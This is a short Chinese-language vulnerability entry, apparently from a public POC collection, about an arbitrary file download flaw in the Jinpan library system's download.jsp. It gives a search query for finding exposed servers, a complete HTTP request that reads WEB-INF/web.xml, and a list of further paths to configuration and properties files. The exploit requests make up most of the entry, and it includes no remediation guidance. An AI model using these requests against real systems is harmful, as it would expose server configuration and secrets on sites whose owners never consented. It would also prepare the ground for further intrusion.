# 金盘图书馆系统download存在任意文件下载漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">金盘移动图书馆系统 download.jsp 任意文件下载，攻击者可通过此漏洞获取敏感信息，从而为下一步攻击做准备。</font>

# 二、影响版本
+ 金盘图书馆系统

# 三、资产测绘
+ hunter`web.body="/opac/opacRssCollect"`
+ 特征


# 四、漏洞复现
```plain
GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=9464BF4CB3C292D28F4239D97F50B1B6
Upgrade-Insecure-Requests: 1
```


其他文件位置

```plain
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/proxy-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/services-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/remoting-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/messaging-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/data-management-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/lcatalina.properties
/pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/application.properties
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fbglrzkd6l0zsdg2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
